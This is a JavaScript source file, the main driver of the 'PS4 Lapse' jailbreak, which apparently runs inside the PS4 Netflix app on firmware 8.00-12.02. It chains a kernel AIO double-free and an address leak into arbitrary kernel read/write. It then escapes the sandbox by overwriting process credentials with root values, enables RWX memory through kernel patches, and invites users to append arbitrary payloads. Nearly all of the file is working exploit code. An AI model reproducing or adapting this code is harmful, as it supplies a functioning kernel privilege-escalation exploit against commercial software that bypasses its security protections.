/*
    PS4 Lapse - Main Execution

    Runs stages 0-5 (jailbreak), then calls run_payload() if defined.
    Append your payload after this file to chain execution.
*/

// === Main Execution ===

(function() {
    try {
        logger.log("=== PS4 Lapse Jailbreak ===");
        logger.flush();

        FW_VERSION = get_fwversion();
        logger.log("Detected PS4 firmware: " + FW_VERSION);
        logger.flush();

        function compare_version(a, b) {
            const [amaj, amin] = a.split('.').map(Number);
            const [bmaj, bmin] = b.split('.').map(Number);
            return amaj === bmaj ? amin - bmin : amaj - bmaj;
        }

        if (compare_version(FW_VERSION, "8.00") < 0 || compare_version(FW_VERSION, "12.02") > 0) {
            logger.log("Unsupported PS4 firmware\nSupported: 8.00-12.02\nAborting...");
            logger.flush();
            send_notification("Unsupported PS4 firmware\nAborting...");
            return;
        }

        kernel_offset = get_kernel_offset(FW_VERSION);
        logger.log("Kernel offsets loaded for FW " + FW_VERSION);
        logger.flush();

        // === STAGE 0: Setup ===
        logger.log("\n=== STAGE 0: Setup ===");
        const setup_success = setup();
        if (!setup_success) {
            logger.log("Setup failed");
            send_notification("Lapse: Setup failed");
            return;
        }
        logger.log("Setup completed");
        logger.flush();

        // === STAGE 1 ===
        logger.log("\n=== STAGE 1: Double-free AIO ===");
        const stage1_start = Date.now();
        const sd_pair = double_free_reqs2();
        const stage1_time = Date.now() - stage1_start;

        if (sd_pair === null) {
            logger.log("[FAILED] Stage 1");
            send_notification("Lapse: FAILED at Stage 1");
            return;
        }
        logger.log("[OK] Stage 1: " + stage1_time + "ms");
        logger.flush();

        // === STAGE 2 ===
        logger.log("\n=== STAGE 2: Leak kernel addresses ===");
        const stage2_start = Date.now();
        const leak_result = leak_kernel_addrs(sd_pair, sds);
        const stage2_time = Date.now() - stage2_start;

        if (leak_result === null) {
            logger.log("[FAILED] Stage 2");
            send_notification("Lapse: FAILED at Stage 2");
            return;
        }
        logger.log("[OK] Stage 2: " + stage2_time + "ms");
        logger.flush();

        // === STAGE 3 ===
        logger.log("\n=== STAGE 3: Double free SceKernelAioRWRequest ===");
        const stage3_start = Date.now();
        const pktopts_sds = double_free_reqs1(
            leak_result.reqs1_addr,
            leak_result.target_id,
            leak_result.evf,
            sd_pair[0],
            sds,
            sds_alt,
            leak_result.fake_reqs3_addr
        );
        const stage3_time = Date.now() - stage3_start;

        syscall(SYSCALL.close, BigInt(leak_result.fake_reqs3_sd));

        if (pktopts_sds === null) {
            logger.log("[FAILED] Stage 3");
            send_notification("Lapse: FAILED at Stage 3");
            return;
        }
        logger.log("[OK] Stage 3: " + stage3_time + "ms");
        logger.flush();

        // === STAGE 4 ===
        logger.log("\n=== STAGE 4: Get arbitrary kernel read/write ===");
        const stage4_start = Date.now();
        const arw_result = make_kernel_arw(
            pktopts_sds,
            leak_result.reqs1_addr,
            leak_result.kernel_addr,
            sds,
            sds_alt,
            leak_result.aio_info_addr
        );
        const stage4_time = Date.now() - stage4_start;

        if (arw_result === null) {
            logger.log("[FAILED] Stage 4");
            send_notification("Lapse: FAILED at Stage 4");
            return;
        }
        logger.log("[OK] Stage 4: " + stage4_time + "ms");
        logger.flush();

        // === STAGE 5: Jailbreak ===
        logger.log("\n=== STAGE 5: Jailbreak ===");
        const stage5_start = Date.now();

        const OFFSET_P_UCRED = 0x40n;
        const proc = kernel.addr.curproc;

        // Calculate kernel base
        kernel.addr.base = kernel.addr.inside_kdata - kernel_offset.EVF_OFFSET;
        logger.log("Kernel base: " + hex(kernel.addr.base));

        const uid_before = Number(syscall(SYSCALL.getuid));
        const sandbox_before = Number(syscall(SYSCALL.is_in_sandbox));
        logger.log("BEFORE: uid=" + uid_before + ", sandbox=" + sandbox_before);

        // Patch ucred
        const proc_fd = kernel.read_qword(proc + kernel_offset.PROC_FD);
        const ucred = kernel.read_qword(proc + OFFSET_P_UCRED);

        kernel.write_dword(ucred + 0x04n, 0n);  // cr_uid
        kernel.write_dword(ucred + 0x08n, 0n);  // cr_ruid
        kernel.write_dword(ucred + 0x0Cn, 0n);  // cr_svuid
        kernel.write_dword(ucred + 0x10n, 1n);  // cr_ngroups
        kernel.write_dword(ucred + 0x14n, 0n);  // cr_rgid

        const prison0 = kernel.read_qword(kernel.addr.base + kernel_offset.PRISON0);
        kernel.write_qword(ucred + 0x30n, prison0);

        kernel.write_qword(ucred + 0x60n, 0xFFFFFFFFFFFFFFFFn);  // sceCaps
        kernel.write_qword(ucred + 0x68n, 0xFFFFFFFFFFFFFFFFn);

        const rootvnode = kernel.read_qword(kernel.addr.base + kernel_offset.ROOTVNODE);
        kernel.write_qword(proc_fd + 0x10n, rootvnode);  // fd_rdir
        kernel.write_qword(proc_fd + 0x18n, rootvnode);  // fd_jdir

        const uid_after = Number(syscall(SYSCALL.getuid));
        const sandbox_after = Number(syscall(SYSCALL.is_in_sandbox));
        logger.log("AFTER:  uid=" + uid_after + ", sandbox=" + sandbox_after);

        if (uid_after === 0 && sandbox_after === 0) {
            logger.log("Sandbox escape complete!");
        } else {
            logger.log("[WARNING] Sandbox escape may have failed");
        }
        logger.flush();

        // === Apply kernel patches via kexec ===
        // Uses syscall_raw() which sets rax manually for syscalls without gadgets
        logger.log("Applying kernel patches...");
        logger.flush();
        const kpatch_result = apply_kernel_patches(FW_VERSION);
        if (kpatch_result) {
            logger.log("Kernel patches applied successfully!");

            // Comprehensive kernel patch verification
            logger.log("Verifying kernel patches...");
            let all_patches_ok = true;

            // 1. Verify mmap RWX patch (0x33 -> 0x37 at two locations)
            const mmap_offsets = get_mmap_patch_offsets(FW_VERSION);
            if (mmap_offsets) {
                const byte1 = Number(ipv6_kernel_rw.ipv6_kread8(kernel.addr.base + BigInt(mmap_offsets[0])) & 0xffn);
                const byte2 = Number(ipv6_kernel_rw.ipv6_kread8(kernel.addr.base + BigInt(mmap_offsets[1])) & 0xffn);
                if (byte1 === 0x37 && byte2 === 0x37) {
                    logger.log("  [OK] mmap RWX patch");
                } else {
                    logger.log("  [FAIL] mmap RWX: [" + hex(mmap_offsets[0]) + "]=" + hex(byte1) + " [" + hex(mmap_offsets[1]) + "]=" + hex(byte2));
                    all_patches_ok = false;
                }
            } else {
                logger.log("  [SKIP] mmap RWX (no offsets for FW " + FW_VERSION + ")");
            }

            // 2. Test mmap RWX actually works by trying to allocate RWX memory
            try {
                const PROT_RWX = 0x7n;  // READ | WRITE | EXEC
                const MAP_ANON = 0x1000n;
                const MAP_PRIVATE = 0x2n;
                const test_addr = syscall(SYSCALL.mmap, 0n, 0x1000n, PROT_RWX, MAP_PRIVATE | MAP_ANON, 0xffffffffffffffffn, 0n);
                if (test_addr < 0xffff800000000000n) {
                    logger.log("  [OK] mmap RWX functional @ " + hex(test_addr));
                    // Unmap the test allocation
                    syscall(SYSCALL.munmap, test_addr, 0x1000n);
                } else {
                    logger.log("  [FAIL] mmap RWX functional: " + hex(test_addr));
                    all_patches_ok = false;
                }
            } catch (e) {
                logger.log("  [FAIL] mmap RWX test error: " + e.message);
                all_patches_ok = false;
            }

            if (all_patches_ok) {
                logger.log("All kernel patches verified OK!");
            } else {
                logger.log("[WARNING] Some kernel patches may have failed");
            }
        } else {
            logger.log("[WARNING] Kernel patches failed - continuing without patches");
        }

        const stage5_time = Date.now() - stage5_start;
        logger.log("[OK] Stage 5: " + stage5_time + "ms - JAILBROKEN");
        logger.flush();

        const total_time = stage1_time + stage2_time + stage3_time + stage4_time + stage5_time;
        logger.log("\n========================================");
        logger.log("  JAILBREAK COMPLETE! Total: " + total_time + "ms");
        logger.log("========================================");
        logger.flush();

        send_notification("Jailbreak OK!");

    } catch (e) {
        logger.log("Lapse Error: " + e.message);
        logger.log(e.stack);
        logger.flush();
        send_notification("Lapse: ERROR - " + e.message);
    }

    // =========================================================
    // Cleanup: Close exploit resources (like yarpe's finally block)
    // This is critical for Netflix to exit cleanly
    // =========================================================
    logger.log("Cleaning up exploit resources...");

    // Close block/unblock socket pair
    if (block_fd !== 0xffffffffffffffffn) {
        syscall(SYSCALL.close, block_fd);
    }
    if (unblock_fd !== 0xffffffffffffffffn) {
        syscall(SYSCALL.close, unblock_fd);
    }

    // Close all sds sockets
    if (sds !== null) {
        for (let i = 0; i < sds.length; i++) {
            if (sds[i] !== 0xffffffffffffffffn) {
                syscall(SYSCALL.close, sds[i]);
            }
        }
    }

    // Close all sds_alt sockets
    if (sds_alt !== null) {
        for (let i = 0; i < sds_alt.length; i++) {
            if (sds_alt[i] !== 0xffffffffffffffffn) {
                syscall(SYSCALL.close, sds_alt[i]);
            }
        }
    }

    // Restore CPU core and rtprio
    if (prev_core !== -1) {
        pin_to_core(prev_core);
    }
    if (prev_rtprio !== 0n) {
        set_rtprio(prev_rtprio);
    }

    logger.log("Exploit cleanup complete");
    logger.flush();
})();
